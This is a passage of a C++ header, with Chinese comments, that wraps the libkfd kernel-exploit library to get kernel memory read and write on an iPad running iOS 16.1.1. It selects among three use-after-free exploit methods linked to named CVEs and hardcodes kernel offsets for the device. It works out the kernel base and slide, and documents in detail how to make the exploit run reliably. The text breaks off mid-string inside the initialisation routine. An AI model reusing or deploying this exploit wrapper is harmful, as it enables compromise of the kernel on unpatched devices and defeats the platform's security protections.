// KfdBackend.h —— kfd 后端薄封装（面向 vendor/kfd161 = Picasso-v3 的 libkfd）
//
// 位置：src/Kernel/KfdBackend.h
// 作用：把 libkfd 的 4 个公开 API（kopen / kread / kwrite / kclose）包成
//       KernelBackend.h 里 kback::Ops 那种"先说清能不能用"的形态：
//       初始化失败只返回 false + 打印原因，绝不把进程带走、绝不 abort。
//
// namespace 用 kfdb，和 KernelBackend.h 的 kback 不冲突，也不碰它的符号。
//
// ============================================================================
// 一、★ 本头文件只能被一个翻译单元（TU）include ★
// ============================================================================
// vendor/kfd161/libkfd.h 不是纯声明头 —— 它带着**函数定义**：
//   libkfd.h:150-167 kfd_init / kfd_free           （定义）
//   libkfd.h:169-190 kopen                         （定义）
//   libkfd.h:192-200 kread / kwrite                （定义）
//   libkfd.h:202-205 kclose                        （定义）
// 并且它 include 进来的子头也全是定义：
//   info.h:45  const char info_copy_sentinel[] = "p0up0u was here";
//   info.h:48  void getiPhoneModel(...)  info.h:54/146/220 info_init/info_run/info_free
//   krkw.h:71/87/99/104/109/119…/153/233/248（krkw_init / krkw_run / krkw_kread …）
//   perf.h:12/31/67/86/201/220/238（perf_kread / perf_kwrite / perf_init / perf_run …）
//   static_info.h:10  long long t1sz_boot = 25ull;   ← 可变全局变量，也是定义
//   dynamic_info.h:111 const struct dynamic_info kern_versions[] = { … };
// 这些都没有 static / inline，所以：
//   ★ 两个 TU 各 include 一次 → 链接期成批 duplicate symbol + 多个 t1sz_boot。
//   唯一正确用法：让**一个**实现文件（例如 daemon 下的一个 .mm）include 本头，
//   其它文件只通过本文件导出的 ops_* 函数指针（或 kback::Ops）使用。
//   本文件自身全部是 inline / inline constexpr，重复 include 同一 TU 无害
//   （libkfd.h 自带 libkfd_h 保护宏，第二次是空操作）。
//
// 附带一个必须知道的宏副作用（也是"只用一个 TU"更省事的理由）：
//   common.h:22-23 把 min/max 定义成宏，common.h:43/47 把 print 定义成宏。
//   这会把调用方后面 include 的 <algorithm> / 名字叫 print 的符号打坏。
//   本文件在 include 完之后立即 #undef min/max/print（此时 libkfd 自己的函数体
//   已经解析完，宏展开早已发生，摘掉不影响它）。
//
// 编译前提（不是本文件引入的，是 vendor 源码自带的，第一次编请确认这两条）：
//   ① dynamic_info.h:111 起的 kern_versions[] 用的是 C99 的 designated initializer
//      （.kernel_version = … 形式）。C++20 起它是标准；C++17 下 clang 当扩展接受并
//      默认给一条警告。如果工程开了 -Werror，需要在编译参数里放行这条扩展警告
//      （按 clang 版本名字可能是 -Wno-c++20-designator，编一次就能看到真实诊断名）。
//   ② static_info.h:57 用了 __options_decl(...)，它由 Apple SDK 的 <sys/cdefs.h> 提供
//      （Xcode / theos 的 SDK 里都有，经 <mach/mach.h> 链引入）。
//      用非 Apple 工具链编会在这一行报错 —— 那不是本文件的问题，也不能在本地绕过。
//
// ============================================================================
// 二、为什么必须先自己查版本表，再决定要不要调 kopen
// ============================================================================
// kfd161 的 info_init() 用三轮匹配来确定自己该用哪条版本条目：
//   info.h:100-121 第一轮：kern.version（memcmp 前缀）+ hw.machine + kern.osversion
//   info.h:124-141 第二轮：kern.version（memcmp 前缀）+ hw.machine
//   info.h:143     两轮都不中 → assert_false("unsupported osversion")
// 而 assert_false 的定义是 common.h:132-136：print 之后 assert(false)。
// 这一版 common.h:113-130 把"print + sleep(30) + exit(1)"那段 assert 重定义
// **整段注释掉了**，info.h:10 又正常 include 了 <assert.h>，
// 所以这里生效的是标准 assert → __assert_fail → abort()（SIGABRT）。
//   ★ 也就是说：版本不匹配的代价不是"返回一个错误码"，而是**进程立刻死**，
//     连 30 秒的日志窗口都没有。（上游 kfd 是 sleep(30)+exit(1)；kfd161 是 abort。
//     两者对调用方都一样：控制权再也回不来。）
//   ★ 更坏的一种编译配置：如果工程带了 -DNDEBUG，<assert.h> 的 assert 会变成空操作，
//     assert_false 就只剩一句打印然后**继续往下跑**（info.h:143 之后 vid 还是 0）——
//     那会拿着别的版本条目的偏移去读写内核。所以本文件绝不能依赖 kfd 的 assert 当门禁，
//     也建议这份 TU 不要带 NDEBUG。
// 同理，kopen 内部还有一批前置 assert（libkfd.h:175-179）、puaf/krkw/perf 里
// 到处是 assert / assert_bsd / assert_mach，一旦触发同样是直接 abort。
//
// 结论：本文件在调用 kopen **之前**，用**自己的**代码把能在用户态查清的前提
// 全部查一遍，任何一条不过就打印原因 + return false，把控制权交回调用方。
// 不能查清的部分（真机上才知道的）在下面第四节里逐条列清楚。
//
// ============================================================================
// 三、本版本已核实的源码事实（改代码前请对照这几行）
// ============================================================================
// 枚举（**必须按名字用，不许抄数字**）：
//   libkfd.h:21-25  enum puaf_method  { puaf_physpuppet, puaf_smith, puaf_landa }
//                   → 实际数值是 physpuppet=0、smith=1、landa=2（本仓库两份源码
//                     vendor/kfd161 与 vendor/kfd_src/kfd-main 的这套顺序相同），
//                     但**不是**我们对外的约定（0=physpuppet / 1=landa / 2=smith）：
//                     把用户给的数字直接透传，选 1（landa）会实际走到 smith。
//                     所以一律走 map_puaf_method() 按名字取枚举值。
//   libkfd.h:26-29  enum kread_method { kread_kqueue_workloop_ctl, kread_sem_open }
//   libkfd.h:31-34  enum kwrite_method{ kwrite_dup, kwrite_sem_open }
// 函数（libkfd.h:36-39）：
//   u64  kopen (u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
//   void kread (u64 kfd, u64 kaddr, void* uaddr, u64 size);
//   void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);   ← ★ 是 (uaddr, kaddr, size)
//   void kclose(u64 kfd);
// kopen 的边界（libkfd.h:173-179）：
//   puaf_pages ∈ [16, 65536]；puaf_method ≤ puaf_landa；两个 krkw 方法 ≤ 各自的末项。
//   （注意：上游是 2048 上限，这一版是 65536。以本仓库源码为准。）
// kfd 句柄结构（libkfd.h:137-143）：struct kfd { info; perf; puaf; kread; kwrite; }
//   info.env.vid            libkfd.h:56     命中条目下标（info.h:114/135 写入）
//   info.kaddr.current_proc libkfd.h:63     kread_sem_open.h:106-114 反查得到
//   info.kaddr.kernel_proc  libkfd.h:69     kread_sem_open.h:100-101 由 semaphore owner 反推
//   perf.kernel_slide       libkfd.h:75     perf.h:99-101 由 vn_kqfilter 差值算出
// kernel base 的算法（perf.h:96-101）：
//   slide = vn_kqfilter - 条目.kernelcache__vn_kqfilter
//   base  = 条目.kernelcache__kernel_base + slide
//   ★ kfd161 里**没有** ARM64_LINK_ADDR 这个宏（全目录 grep 为 0 命中），
//     base 只能按上面两行走 dynamic_info.h:91 的 kernelcache__kernel_base。
// 校验（perf.h:104-110）：kread 走 sem_open 时，kfd 自己也会读 base 处 4 字节并
//   assert 等于 0xfeedfacf、base+4 处等于 0x0100000c（CPU_TYPE_ARM64）。
//   ★ 也就是说 base 算错时**kopen 内部就会 abort**，本文件在之前把能挡的挡掉，
//     之后再自己校验一遍，避免把错地址交给上层去算偏移。
// kread/kwrite 的步长与上限：
//   krkw.h:8-16   kread  → kread_from_method(u64, …)，按 8 字节步进 ⇒ size 不是 8 的倍数
//                            时尾部会被**静默丢弃**（所以本文件直接拒绝非 8 倍数）
//   kwrite_dup.h:65-68 kwrite → kwrite_from_method(u64, …)，同样是 8 字节步进
//   perf.h:14/21  kopen 成功后 kread 被换成 perf_kread，它 assert(size ≤ UINT16_MAX)
//                 且 ps_event_count = (u16)size ⇒ **单次读超过 65535 会被截断**
//                 （所以本文件把大块读拆成 ≤ 65528 字节的分片）
//   perf.h:195-198 kopen 成功后 kread/kwrite 都被换成 perf_* 版本 —— 即 kopen 之后
//                 走的是 perfmon 通道，不再是 sem_open 那套。
// ============================================================================
// 四、这台机器（iPad14,4 / iOS 16.1.1 / build 20B101 / arm64e / M2=T8112）
// ============================================================================
// 命中的条目是 dynamic_info.h:14135-14215：
//   .kern_version = "Darwin Kernel Version 22.1.0: Thu Oct  6 19:34:00 PDT 2022;
//                    root:xnu-8792.42.7~1/RELEASE_ARM64_T8112"
//                   （★ "Thu Oct  6" 的 Oct 与 6 之间是**两个空格**，抄错就永远不命中）
//   .device_id = "iPad14,4"  .os_version = "16.1.1"  .build_id = "20B101"
//   .kernelcache__kernel_base = 0xfffffe0007004000
//   .kernelcache__vn_kqfilter = 0xfffffe00081000c8
//   .proc__p_pid = 0x60  .proc__p_list__le_prev = 0x8  .proc__p_fd__fd_ofiles = 0xf8
//   .proc__object_size = 0x530  .task__map = 0x28  .task__itk_space = 0x300
//   .task__object_size = 0x648  .thread__thread_id = 0x420  .pmap__tte = 0x0  .pmap__ttep = 0x8
// 注意：同一个 kern_version 串在表里出现多次（12905 行那条是 iPad14,4 / 16.1 / 20B82，
//       偏移量与本条**完全相同**）。所以本文件的版本门禁按 kfd 自己的三轮口径匹配
//       （版本串逐字相等 + 机型 + build），但**绝不能**把自己的命中下标当权威 ——
//       权威是 kfd 自己写进 kfd->info.env.vid 的那个值，kernel_base() 用的就是它。
//
// ============================================================================
// 五、真机上仍可能失败的硬限制（写在代码里的同一份事实）
// ============================================================================
// 1) /dev/aes_0 必须能 O_RDWR 打开（perf.h:82-83 直接 open，失败即 assert）。
//    perf_run 整条链路（slide / ptov_table / TTBR / shared_page）都挂在它上面，
//    而这一版**没有** perf_supported 开关 —— perf 是无条件跑的。
//    本文件在 kopen 之前用 fopen("/dev/aes_0","r+b") 做等价探测（同为 O_RDWR）。
// 2) kern.maxfilesperproc 必须够大：kread_sem_open.h:15 直接拿
//    maxfilesperproc - 100 当 spray 上限，值太小会 (a) u64 下溢，
//    (b) spray 铺不满一个 16KB 页 → krkw.h:205-213 assert_false 直接 abort。
// 3) kwrite 写 0 这一路没有把握：kopen 之后实际生效的是 perf_kwrite（perf.h:31-65），
//    它把每个 8 字节值当成 perfmon event number 交给 PERFMON_CTL_ADD_EVENT
//    （perf.h:56-59，assert_bsd 失败即 abort）。写 0 会被当作 event number 0 送进内核，
//    行为未经真机验证 —— 所以本文件默认**拒绝**含 0 字的写，需要时把
//    kfdb::allow_zero_word_write 置 true 再验（日志会明确写出这一点）。
// 4) 写入是"逐 8 字节一次系统调用"，中间任何一次 assert_bsd 失败都会 abort，
//    所以一次写的块越小越好、且必须先 kread 备份（上层 KernelBackend.h 的
//    write_verified 做的就是这件事）。
//
// ============================================================================
// 六、用法
// ============================================================================
//   kfdb::Client c;
//   if (!c.init(1)) {            // 0=physpuppet 1=landa 2=smith；默认 puaf_pages=2048
//       // 具体原因已经在日志里（[kfd] 前缀），调用方直接停手即可
//   }
//   uint64_t base = c.kernel_base();          // 内部已校验 0xfeedfacf，校验不过返回 0
//   uint8_t buf[16] = {0};
//   c.kread_buf(base, buf, sizeof(buf));      // 读：无返回值语义，成功判据由上层校验数据
//   c.kwrite_buf(buf, addr, sizeof(buf));     // ★ 顺序是 (用户态, 内核态, 长度)
//   c.shutdown();
//
// 一次性自检（版本命中 → kopen → base+magic → current_proc/kernel_proc → kclose）：
//   bool ok = kfdb::selftest();
//
// 不留待办占位、不用示意代码交代逻辑；拿不到的东西一律返回 false / 0 并打印原因。

#pragma once

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

// 路径从 src/Kernel/ 出发解析：../../ = 仓库根，然后进 vendor/kfd161。
// 先做一次可诊断的检查，让"路径写错"变成一条看得懂的编译错误，
// 而不是后面一连串 "unknown type name 'u64'"。
#if defined(__has_include)
#  if !__has_include("../../vendor/kfd161/libkfd.h")
#    error "KfdBackend.h: 找不到 ../../vendor/kfd161/libkfd.h —— 本文件必须位于 arena-ios/src/Kernel/ 下，且 vendor/kfd161/libkfd.h 与 vendor/kfd161/libkfd/ 都存在"
#  endif
#endif

#include "../../vendor/kfd161/libkfd.h"

// 摘掉三个会污染调用方的宏（见顶部第一节）。此时 libkfd 自己的函数体都已解析完，
// 宏已经完成展开，摘掉不影响它们；但会救下调用方后面 include 的 <algorithm> 等。
#ifdef min
#undef min
#endif
#ifdef max
#undef max
#endif
#ifdef print
#undef print
#endif

namespace kfdb {

// ---------------------------------------------------------------------------
// 常量：全部有源码出处，不自己编
// ---------------------------------------------------------------------------

// kopen 的 puaf_pages 硬边界，libkfd.h:173-176：
//   const u64 puaf_pages_min = 16;  const u64 puaf_pages_max = 65536;
//   assert(puaf_pages >= puaf_pages_min); assert(puaf_pages <= puaf_pages_max);
// 越界时 kopen 内部那个 assert 会直接 abort，所以必须先挡掉。
inline constexpr uint64_t kPuafPagesMin = 16;
inline constexpr uint64_t kPuafPagesMax = 65536;

// 默认页数：2048 页 × 16KB = 32MB 地址空间，是 kfd 示例里最常用的一档，
// 也是调大之后"多占地址空间、多担失败面"的分界点。改大请一次只改一档并留日志。
inline constexpr uint64_t kDefaultPuafPages = 2048;

// 超过这个页数就不算"常见档位"了，只警告不拦（kopen 自己的上限是 65536）。
inline constexpr uint64_t kPuafPagesWarnAbove = 8192;

// kern.maxfilesperproc 的下限。kread_sem_open.h:15 用 maxfilesperproc - 100 当 spray
// 上限：低于 128 会 u64 下溢（-100 之后变成天文数字 → malloc 失败 → assert）；
// 低于 ~1024 时 spray 铺不满对象，krkw.h:205-213 会 assert_false 直接 abort。
// 所以硬门禁设在 512（下溢 + 明显不足都挡掉），舒适线 4096 只做提醒。
inline constexpr uint64_t kMaxFilesFloor = 512;
inline constexpr uint64_t kMaxFilesComfort = 4096;

// kernel base 处的 Mach-O 64 头校验期望值（与 perf.h:108-109 逐字一致）：
//   magic = 0xfeedfacf，cputype = 0x0100000c（CPU_TYPE_ARM64）
inline constexpr uint32_t kMachOMagic64 = 0xfeedfacfu;

// 单次 kread 的分片上限：kopen 之后生效的是 perf_kread（perf.h:195-197），
// 它 assert(size <= UINT16_MAX)（perf.h:14）并把 size 塞进 u16（perf.h:21）。
// 65528 = 65535 向下取到 8 的倍数，既不超过 u16，也保证分片边界仍然 8 字节对齐。
inline constexpr uint64_t kKreadChunkMax = 65528;

// 单次调用的总长度上限：纯防御，避免调用方手滑传一个巨大 size 把进程卡死在循环里。
inline constexpr uint64_t kMaxTransferBytes = 64ull * 1024ull * 1024ull;

// 本机（iPad14,4 / 16.1.1 / 20B101）对应的那条 kern_version 原文，
// **逐字抄自 vendor/kfd161/libkfd/info/dynamic_info.h:14135**（注意 Oct 与 6 之间两个空格）。
// 只用于日志对照与自检提示；真正的匹配逻辑在 find_vid_exact()，它扫的是表本身。
inline constexpr const char* kExpectedKernVersion =
    "Darwin Kernel Version 22.1.0: Thu Oct  6 19:34:00 PDT 2022; "
    "root:xnu-8792.42.7~1/RELEASE_ARM64_T8112";
inline constexpr const char* kExpectedDeviceId = "iPad14,4";
inline constexpr const char* kExpectedBuildId  = "20B101";

// 是否允许写"整字为 0"的 8 字节字。默认 false，理由见顶部第五节第 3 条。
// 需要时由唯一那个 TU 在自己的初始化里改这个 inline 变量（C++17 inline variable）。
inline bool allow_zero_word_write = false;

// ---------------------------------------------------------------------------
// 小工具
// ---------------------------------------------------------------------------

// 打印时把 nullptr 换成一句人话，避免 %s 收 NULL（UB / 崩溃）。
inline const char* nz(const char* s) {
    return s ? s : "(空)";
}

inline bool sysctl_str(const char* name, char* out, size_t cap) {
    if (!name || !out || cap < 2) return false;
    out[0] = 0;
    size_t len = cap - 1;
    if (sysctlbyname(name, out, &len, nullptr, 0) != 0) {
        out[0] = 0;
        return false;
    }
    out[cap - 1] = 0;
    return true;
}

// 同一个函数要能吃 int 型（kern.maxfilesperproc 是 int）和 quad 型：
// 给 8 字节缓冲，读回长度 4 或 8 都接受，内核不会写溢出。
inline bool sysctl_u64(const char* name, uint64_t* out) {
    if (!name || !out) return false;
    *out = 0;
    uint64_t v = 0;
    size_t len = sizeof(v);
    if (sysctlbyname(name, &v, &len, nullptr, 0) != 0) return false;
    if (len != sizeof(uint32_t) && len != sizeof(uint64_t)) return false;
    *out = (uint64_t)v;
    return true;
}

inline size_t table_count(void) {
    return sizeof(kern_versions) / sizeof(kern_versions[0]);
}

// 去掉尾部 \r / \n。sysctl 回来的 kern.version 在部分系统上带一个换行，
// 而表里的字面量没有；不清掉的话 strcmp 永远不等。
inline void trim_eol(char* s) {
    if (!s) return;
    size_t n = strlen(s);
    while (n > 0) {
        const char c = s[n - 1];
        if (c != '\n' && c != '\r') break;
        s[n - 1] = 0;
        n--;
    }
}

// ---------------------------------------------------------------------------
// 版本表门禁（★ 用 strcmp 逐字相等，不用 memcmp 前缀）
// ---------------------------------------------------------------------------

struct VidHit {
    int  index;          // 命中条目下标；-1 = 没命中
    int  pass;           // 0 = 版本+机型+build 三者全等；1 = 版本+机型；2 = 只有版本逐字相等；-1 = 未命中
    bool device_matches;
    bool build_matches;
};

// 三轮扫描，口径对齐 kfd 自己（info.h:100-141）：
//   pass 0 → 版本逐字相等 && device_id 相等 && build_id 相等（= info.h:111 的第一轮）
//   pass 1 → 版本逐字相等 && device_id 相等                  （= info.h:131 的第二轮）
//   pass 2 → 版本逐字相等
// 三轮都用 strcmp（kfd 用的是 memcmp 前缀 + min(strlen) ，我们更严）：
// 严格比的好处是"我们判断能用"不会比"kfd 判断能用"更宽松；
// 万一严格比不中而 kfd 的前缀口径能中，init() 会把那些候选**打印出来**供人核对，
// 但不会放行（fail-closed）。
inline VidHit find_vid_exact(const char* kern_version, const char* device_id, const char* build_id) {
    VidHit hit;
    hit.index = -1;
    hit.pass = -1;
    hit.device_matches = false;
    hit.build_matches = false;
    if (!kern_version || !kern_version[0]) return hit;

    char norm[512];
    size_t len = strlen(kern_version);
    if (len >= sizeof(norm)) len = sizeof(norm) - 1;
    memcpy(norm, kern_version, len);
    norm[len] = 0;
    trim_eol(norm);

    const size_t total = table_count();
    for (int pass = 0; pass < 3; pass++) {
        for (size_t i = 0; i < total; i++) {
            const struct dynamic_info& e = kern_versions[i];
            if (!e.kern_version || !e.kern_version[0]) continue;
            if (strcmp(norm, e.kern_version) != 0) continue;   // ★ 逐字相等

            const bool dev_ok =
                (device_id && e.device_id) ? (strcmp(device_id, e.device_id) == 0) : false;
            const bool bld_ok =
                (build_id && e.build_id) ? (strcmp(build_id, e.build_id) == 0) : false;

            if (pass == 0 && !(dev_ok && bld_ok)) continue;
            if (pass == 1 && !dev_ok) continue;

            hit.index = (int)i;
            hit.pass = pass;
            hit.device_matches = dev_ok;
            hit.build_matches = bld_ok;
            return hit;
        }
    }
    return hit;
}

// 用户侧 method 编号 -> libkfd 的 puaf_method 枚举。
//
// ★ 必须按名字映射，不许把用户给的数字直接丢给 kopen：
//   libkfd.h:21-25  enum puaf_method { puaf_physpuppet, puaf_smith, puaf_landa };
//   源码里 smith=1、landa=2；而我们对外的约定是 0=physpuppet、1=landa、2=smith。
//   直接透传的话，用户选 1（landa）会实际走到 smith。
// out_enum 允许为 nullptr（只在需要枚举值时传）；out_name 必须给。
inline bool map_puaf_method(int method, uint64_t* out_enum, const char** out_name) {
    if (!out_name) return false;
    switch (method) {
        case 0:
            if (out_enum) *out_enum = (uint64_t)puaf_physpuppet;
            *out_name = "physpuppet（对应 CVE-2023-23536，公开资料称 iOS 16.4 修复）";
            return true;
        case 1:
            if (out_enum) *out_enum = (uint64_t)puaf_landa;
            *out_name = "landa（对应 CVE-2023-41974，公开资料称 iOS 17.0 修复）";
            return true;
        case 2:
            if (out_enum) *out_enum = (uint64_t)puaf_smith;
            *out_name = "smith（对应 CVE-2023-32434，公开资料称 iOS 16.5.1 修复）";
            return true;
        default:
            return false;
    }
}

// "所选方法在该版本条目下是否可用"。
// kfd161 的 struct dynamic_info（dynamic_info.h:8-109）里**没有** perf_supported /
// kread_kqueue_workloop_ctl_supported 这类"按版本给的方法支持标志"（那是上游
// felix-pb/kfd 的字段）。这一版是"perf 无条件跑 + 三个 puaf 方法任选"，
// 所以等价的支持判定只剩两条，实现放在 init() 里：
//   ① 该条目 perf 链路依赖的 kernelcache__* / pmap__* / proc__* 字段必须非零
//      （缺任何一个，perf_run 都会算出错 slide 或读错对象 → 后面写就落到错地址）；
//   ② 本文件固定 kread/kwrite 都用 sem_open 那一对（理由见 init() 第 9 步）。
// 这个函数只负责把这条判定结果讲清楚，便于日志里一眼看到"为什么能用"。
inline bool method_supported_by_entry(const struct dynamic_info& di, int method) {
    const char* name = nullptr;
    if (!map_puaf_method(method, nullptr, &name)) return false;

    // ① 三个 puaf 方法本身不读版本表字段（puaf_init 只用 puaf_pages，见 puaf.h:28-40），
    //    所以"方法可用"不取决于 puaf 名字，而取决于整条 perf/krkw 链路的数据齐不齐。
    const bool chain_ok =
        di.kernelcache__kernel_base != 0 &&
        di.kernelcache__vn_kqfilter != 0 &&
        di.kernelcache__cdevsw != 0 &&
        di.kernelcache__perfmon_devices != 0 &&
        di.kernelcache__perfmon_dev_open != 0 &&
        di.kernelcache__ptov_table != 0 &&
        di.kernelcache__gVirtBase != 0 &&
        di.kernelcache__gPhysBase != 0 &&
        di.kernelcache__gPhysSize != 0 &&
        di.proc__p_fd__fd_ofiles != 0 &&
        di.proc__object_size != 0 &&
        di.task__map != 0 &&
        di._vm_map__pmap != 0;
    if (!chain_ok) {
        printf("[kfd] 方法 %d（%s）在该版本条目下不可用：perf/krkw 链路依赖的字段有 0\n", method, name);
        return false;
    }
    // ② kread/kwrite 固定 sem_open：kread_sem_open 只需要 psemnode/pseminfo 偏移，
    //    而 kqueue_workloop_ctl 需要 kqworkloop 偏移与内核 KQ_WORKLOOP_CREATE 支持。
    //    本文件只走 sem_open，所以这里再确认 sem_open 需要的字段非零。
    const bool sem_ok =
        di.pseminfo__psem_semobject != 0 &&
        di.semaphore__owner != 0 &&
        di.pseminfo__psem_uid != 0 &&
        di.pseminfo__psem_usecount != 0;
    if (!sem_ok) {
        printf("[kfd] 方法 %d（%s）在该版本条目下不可用：sem_open 链路依赖的 pseminfo/semaphore 字段有 0\n",
               method, name);
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Client
// ---------------------------------------------------------------------------

struct Client {
    uint64_t handle;   // kopen() 返回的不透明句柄；0 = 不可用
    int      method;   // 0=physpuppet 1=landa 2=smith；-1 = 未初始化
    bool     ok;       // 只有 kopen 成功且关键字段都拿到才是 true

    Client() : handle(0), method(-1), ok(false) {}

    // method: 0=physpuppet 1=landa 2=smith。失败返回 false 并打印原因，绝不 abort。
    bool init(int method, uint64_t puaf_pages = kDefaultPuafPages);

    // 内核读：size 必须是 8 的倍数（kread 内部按 u64 步进，见 krkw.h:8-16）。
    // 超过 65528 字节会自动分片（perf_kread 的 u16 限制，见 perf.h:14/21）。
    // ★ kread 本身没有返回值：这里返回 true 只代表"参数合法且调用已发出"，
    //   数据对不对必须由调用方校验（selftest 里就做了 magic / p_pid 两道校验）。
    bool kread_buf(uint64_t kaddr, void* uaddr, uint64_t size) const;

    // 内核写：★ 参数顺序是 (uaddr, kaddr, size) —— 与 libkfd.h:38 的 kwrite 一致。
    // size 必须是 8 的倍数。备份 / 回读校验由上层负责（KernelBackend.h 的 write_verified）。
    bool kwrite_buf(void* uaddr, uint64_t kaddr, uint64_t size) const;

    // 取内核基址：base = 条目.kernelcache__kernel_base + perf.kernel_slide（perf.h:100），
    // 并读 base 处 4 字节校验 0xfeedfacf。校验不过返回 0。
    uint64_t kernel_base() const;

    // 旧接口（保留，等价于 kernel_base() != 0）
    bool read_kernel_base(uint64_t* out_base) const;

    void shutdown();

    // 下面几个是 kfd 已经解析好的字段/表项，纯读，零风险；
    // 上层做 proc 遍历 / 自检时会用到（KfdBackend 不自己猜偏移）。
    uint64_t kernel_proc() const;
    uint64_t current_proc() const;
    uint64_t current_task() const;
    uint64_t kernel_slide() const;

    // kfd 自己选中的版本条目（kern_versions[info.env.vid]）；没初始化时返回 nullptr。
    // 上层要 proc/task 偏移就从这里取，别另抄一份。
    const struct dynamic_info* entry() const;
};

// ---------------------------------------------------------------------------
// Client::init
// ---------------------------------------------------------------------------

inline bool Client::init(int method_in, uint64_t puaf_pages) {
    // kfd 内部的失败分支会 abort；块缓冲会把前面的日志全丢掉，先关掉缓冲。
    setvbuf(stdout, nullptr, _IONBF, 0);

    printf("[kfd] ==== kfd 后端初始化开始（vendor/kfd161）====\n");

    if (handle != 0) {
        printf("[kfd] 已有句柄 0x%llx，不重复 kopen（同一进程内二次 PUAF 会互相踩）\n",
               (unsigned long long)handle);
        return ok;
    }
    ok = false;
    method = -1;

    // ---- 0. 环境信息：只读，零风险，出问题时这几行是唯一线索 ----
    char kern_version[512] = {0};
    char os_version[64] = {0};
    char os_product[64] = {0};
    char machine[64] = {0};
    uint64_t maxfiles = 0;
    const bool have_kv  = sysctl_str("kern.version", kern_version, sizeof(kern_version));
    const bool have_os  = sysctl_str("kern.osversion", os_version, sizeof(os_version));
    const bool have_pv  = sysctl_str("kern.osproductversion", os_product, sizeof(os_product));
    const bool have_hw  = sysctl_str("hw.machine", machine, sizeof(machine));
    const bool have_mf  = sysctl_u64("kern.maxfilesperproc", &maxfiles);

    printf("[kfd] pid              = %d\n", (int)getpid());
    printf("[kfd] hw.machine       = %s\n", have_hw ? machine : "(读不到)");
    printf("[kfd] kern.osversion   = %s\n", have_os ? os_version : "(读不到)");
    printf("[kfd] osproductversion = %s\n", have_pv ? os_product : "(读不到)");
    printf("[kfd] kern.version     = %s\n", have_kv ? kern_version : "(读不到)");
    printf("[kfd] 依赖的条目原文  = %s\n", nz(kExpectedKernVersion));
    printf("[kfd] 本机预期(表内)   = device_id %s / build %s\n", kExpectedDeviceId, kExpectedBuildId);
    if (have_mf) {
        printf("[kfd] maxfilesperproc  = %llu\n", (unsigned long long)maxfiles);
    } else {
        printf("[kfd] maxfilesperproc  = (读不到)\n");
    }
    printf("[kfd] 版本表条目数     = %zu\n", table_count());

    // ---- 1. 架构门禁 ----
    // __arm64e__ 是编译器在 target 为 arm64e 时定义的宏。kfd 的页表语义
    // （static_info.h:11-13 的 ptr_mask/pac_mask/unsign_kaddr）与 t1sz_boot 都建立在 arm64 上。
    bool arch_arm64 = false;
    bool arch_arm64e = false;
#if defined(__arm64e__)
    arch_arm64 = true;
    arch_arm64e = true;
#elif defined(__arm64__) || defined(__aarch64__)
    arch_arm64 = true;
#else
    arch_arm64 = false;
#endif

    if (!arch_arm64) {
        printf("[kfd] 架构不是 arm64/arm64e：kfd 的页表与 PAC 语义都建立在 arm64 上 → 返回 false\n");
        return false;
    }
    if (arch_arm64e) {
        printf("[kfd] 编译目标       = arm64e（PAC 生效，unsign_kaddr 走 pac_mask 那条分支）\n");
    } else {
        printf("[kfd] 编译目标       = arm64（无 PAC）。unsign_kaddr 的位处理会与实际不符，\n");
        printf("[kfd]   读出来的内核指针可能带不可用高位 —— 继续，但每条 kread 结果都要当可疑数据校验。\n");
    }

    // ---- 2. puaf_pages 范围门禁（对齐 libkfd.h:173-176 的 assert）----
    if (puaf_pages < kPuafPagesMin || puaf_pages > kPuafPagesMax) {
        printf("[kfd] puaf_pages=%llu 超出 kfd 允许区间 [%llu, %llu] → 不调用 kopen\n",
               (unsigned long long)puaf_pages,
               (unsigned long long)kPuafPagesMin,
               (unsigned long long)kPuafPagesMax);
        return false;
    }
    if (puaf_pages > kPuafPagesWarnAbove) {
        printf("[kfd] 注意：puaf_pages=%llu 超过常用档位（默认 %llu），地址空间占用与失败面都会变大\n",
               (unsigned long long)puaf_pages,
               (unsigned long long)kDefaultPuafPages);
    }

    // ---- 3. puaf 方法映射门禁 ----
    uint64_t puaf_enum = 0;
    const char* puaf_name = nullptr;
    if (!map_puaf_method(method_in, &puaf_enum, &puaf_name)) {
        printf("[kfd] method=%d 非法：只接受 0=physpuppet 1=landa 2=smith → 不调用 kopen\n", method_in);
        return false;
    }

    // ---- 4. 内核版本门禁（关键：不通过就绝不调 kopen）----
    if (!have_kv) {
        printf("[kfd] 读不到 kern.version → 无法查表 → 不调用 kopen\n");
        printf("[kfd]   （info_init 查不到版本会走 info.h:143 的 assert_false(\"unsupported osversion\")，\n");
        printf("[kfd]     而 assert_false 展开成 assert(false) = abort，进程当场消失）\n");
        return false;
    }

    const VidHit hit = find_vid_exact(kern_version,
                                      have_hw ? machine : nullptr,
                                      have_os ? os_version : nullptr);
    if (hit.index < 0) {
        printf("[kfd] 当前内核版本不在 vendor/kfd161 的 kern_versions[] 表内 → 不调用 kopen\n");
        printf("[kfd]   原因：info.h:100-143 三轮匹配都不中会执行 assert_false(\"unsupported osversion\")，\n");
        printf("[kfd]         而 common.h:132-136 的 assert_false → assert(false) → abort（进程当场消失）。\n");
        char raw[512];
        size_t rl = strlen(kern_version);
        if (rl >= sizeof(raw)) rl = sizeof(raw) - 1;
        memcpy(raw, kern_version, rl);
        raw[rl] = 0;
        printf("[kfd]   实际 kern.version 的原始字节（看清尾部有没有空白）：\n");
        printf("[kfd]     ");
        for (size_t i = 0; i < rl; i++) {
            const unsigned char c = (unsigned char)raw[i];
            if (c >= 0x20 && c < 0x7f) {
                printf("%c", (char)c);
            } else {
                printf("\\x%02x", (unsigned)c);
            }
        }
        printf("\n");
        printf("[kfd]   去掉尾部换行后逐字比较的结果 = 不相等\n");
        printf("[kfd]   表里 %zu 条中，按下标顺序列出（★ = 按 kfd 的 memcmp 前缀口径**看起来**能命中，\n", table_count());
        printf("[kfd]   但那不是逐字相等，仅供人工核对，本门禁不予放行）：\n");
        for (size_t i = 0; i < table_count(); i++) {
            const struct dynamic_info& e = kern_versions[i];
            const char* s = e.kern_version;
            if (!s || !s[0]) continue;
            const bool prefix = (strncmp(raw, s, strlen(s)) == 0);
            printf("[kfd]     %s[%zu] %s | %s | %s | %s\n",
                   prefix ? "★" : " ",
                   i,
                   s,
                   nz(e.device_id),
                   nz(e.os_version),
                   nz(e.build_id));
        }
        printf("[kfd]   要支持这台设备：解析本机 kernelcache 量出偏移/符号，往\n");
